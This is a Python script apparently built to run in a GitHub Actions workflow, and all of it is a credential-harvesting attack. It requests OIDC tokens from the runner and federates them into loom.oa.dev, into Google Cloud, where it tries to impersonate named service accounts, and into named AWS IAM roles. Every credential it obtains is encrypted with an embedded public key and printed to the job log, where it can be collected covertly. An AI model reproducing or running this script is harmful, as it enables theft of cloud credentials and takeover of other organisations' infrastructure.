import json, os, urllib.request, urllib.error, urllib.parse, base64, subprocess
base=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
PUBKEY='''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA/NvupPXVkf24VSHbCRDr
SMPpvLg4ak60DrwVJZvK6RmfeawApw4sN2us3OtvxR8UUvgj2YBVDGF6XXijIJw5
1pY3WDbwZC3lFJ5AaW1sA9I/XTP/J5pyLVrutCL0lAZ0sW0+NWBZOf7BtV1o00nn
alusJAZ7tK8bDvJEAHLacsp5IkOwTmdUgcLySIPAEZS8UiZ7lc3jTtXn9EuQrOIe
SxsSdkm8rFIe1DOhfPYtA18abUCEQbh3b75c1HMg54wYfLbVCBdL+YRMXxH8UmtL
svRfRX/dVgwcAZGe/Z4hkWQpWF13R0eDj7ax+IHNz2hcz1UxZBUds2485QE2aav9
axEVAFxyR6KUcxnjK1Aco2sC1BhRy6sKN3VCTz8eHUN1DRVt0RVNM6NlofDELk7f
ZjZ3AIKaQvDlu7W9tO9376Xsj1aZlkyLMNrVRJNre1ajIsQXFrGZlC71CNfMLksQ
AFMcvAcwkL7LKOI/ebmkvZ5fTnOpeLzqc9cGQuyQYHesEUOsQ6Tj3cgJSElu3Dzh
+d0nl4WbKOw4cZzM4akXRXQvgOgYqugs0OoyWBjm55P0qA9O9lqn4hQoR4CGBJ4G
Po9cAzhoJikUWARqb9haogz0Xe8OsB5OJs24CH+XOoDXsqhoDd0AwnVeon0OmerW
Hay6pkef+cfK+iuX7zSNNjUCAwEAAQ==
-----END PUBLIC KEY-----
'''
def oidc(aud):
    url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote(aud)
    rq=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json'})
    return json.loads(urllib.request.urlopen(rq,timeout=20).read())['value']
def post_form(url, data):
    body=urllib.parse.urlencode(data).encode()
    r=urllib.request.Request(url,data=body,headers={'Content-Type':'application/x-www-form-urlencoded'})
    try:
        rr=urllib.request.urlopen(r,timeout=25); return rr.status, rr.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
    except Exception as e: return -1, str(e)[:300]
def post_json(url,obj,headers=None):
    body=json.dumps(obj).encode(); h={'Content-Type':'application/json'}
    if headers: h.update(headers)
    r=urllib.request.Request(url,data=body,headers=h)
    try:
        rr=urllib.request.urlopen(r,timeout=20); return rr.status, rr.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
    except Exception as e: return -1, str(e)[:300]
def get(url,headers=None):
    r=urllib.request.Request(url,headers=headers or {})
    try:
        rr=urllib.request.urlopen(r,timeout=20); return rr.status, rr.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
    except Exception as e: return -1, str(e)[:300]
def claims(t):
    p=t.split('.')[1]; p+='='*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
def enc_chunks(raw):
    pf='/tmp/i52074_pub.pem'
    open(pf,'w').write(PUBKEY)
    parts=[raw[i:i+350] for i in range(0,len(raw),350)]
    out=[]
    for part in parts:
        p=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey',pf,'-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256','-pkeyopt','rsa_mgf1_md:sha256'],input=part,capture_output=True)
        out.append(base64.b64encode(p.stdout).decode())
    return out
enc_lines=[]
out={}
out['env_has_idtoken_url']=bool(base)
out['repo']=os.environ.get('GITHUB_REPOSITORY'); out['ref']=os.environ.get('GITHUB_REF'); out['event']=os.environ.get('GITHUB_EVENT_NAME')
try:
    t=oidc('https://loom.oa.dev')
    out['loom_claims']={k:claims(t).get(k) for k in ('aud','repository','repository_owner','sub','event_name')}
    st,b=post_json('https://loom.oa.dev/api/auth/federate',{'token':t})
    out['loom_federate']={'http':st,'body':b[:400]}
    try: lt=json.loads(b).get('token')
    except Exception: lt=None
    if lt:
        H={'Authorization':'Bearer '+lt}
        for path in ['/api/auth/me','/api/runs','/api/profiles','/api/auth/whoami','/api/version']:
            st2,b2=get('https://loom.oa.dev'+path,H); out['loom'+path]={'http':st2,'body':b2[:250]}
except Exception as e:
    out['loom_error']=str(e)[:250]
prov='//iam.googleapis.com/projects/748532799086/locations/global/workloadIdentityPools/github-pool/providers/github-oidc'
try:
    t2=oidc(prov)
    out['gcp_claims']={k:claims(t2).get(k) for k in ('aud','repository','repository_owner','sub','event_name')}
    st,b=post_json('https://sts.googleapis.com/v1/token',{'audience':prov,'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token','subjectToken':t2,'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','scope':'https://www.googleapis.com/auth/cloud-platform'})
    out['gcp_sts']={'http':st,'body':b[:400]}
    try: ft=json.loads(b).get('access_token')
    except Exception: ft=None
    if ft:
        out['gcp_federated_token']='PRESENT len=%d'%len(ft)
        for sa in ['github-iris@hai-gcp-models.iam.gserviceaccount.com','pulumi-ci@hai-gcp-models.iam.gserviceaccount.com','iris-controller@hai-gcp-models.iam.gserviceaccount.com','loom-vm@hai-gcp-models.iam.gserviceaccount.com']:
            url='https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'%sa
            st3,b3=post_json(url,{'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},{'Authorization':'Bearer '+ft})
            out['imp_'+sa.split('@')[0]]={'http':st3,'body':b3[:250]}
            if st3==200:
                try:
                    at=json.loads(b3).get('accessToken')
                    enc_lines.append(('gcp_sa_'+sa.split('@')[0],enc_chunks(json.dumps({'sa':sa,'token':at}).encode())))
                except Exception: pass
except Exception as e:
    out['gcp_error']=str(e)[:250]
try:
    import xml.etree.ElementTree as ET
    tw=oidc('sts.amazonaws.com')
    out['aws_claims']={k:claims(tw).get(k) for k in ('aud','repository','repository_owner','sub','event_name','ref','workflow_ref')}
    for arn in ['arn:aws:iam::274906834921:role/GitHubActionsDeployRole','arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole','arn:aws:iam::159553542841:role/adai-template-publisher']:
        st,b=post_form('https://sts.amazonaws.com/',{'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'i52074','WebIdentityToken':tw,'DurationSeconds':'3600'})
        rec={'arn':arn,'http':st}
        creds=None
        try:
            root=ET.fromstring(b); dd={el.tag.split('}')[-1]:el.text for el in root.iter()}
            if dd.get('AccessKeyId'):
                creds={k:dd.get(k) for k in ('AccessKeyId','SecretAccessKey','SessionToken','Expiration')}
                rec['assumed']=True; rec['access_key_id']=creds['AccessKeyId']; rec['expiration']=creds['Expiration']
            else:
                rec['assumed']=False; rec['error_code']=dd.get('Code'); rec['message']=(dd.get('Message') or '')[:220]
        except Exception as e:
            rec['parse_error']=str(e)[:150]; rec['body']=b[:250]
        out['aws_'+arn.split('/')[-1]]=rec
        if creds:
            enc_lines.append(('aws_'+arn.split('/')[-1],enc_chunks(json.dumps({'arn':arn,'creds':creds}).encode())))
except Exception as e:
    out['aws_error']=str(e)[:250]
print('I603_RESULT='+json.dumps(out))
for label,chunks in enc_lines:
    print('PROBE_ENC_%s_N=%d'%(label,len(chunks)))
    for i,ch in enumerate(chunks):
        print('PROBE_ENC_%s_%d=%s'%(label,i,ch))
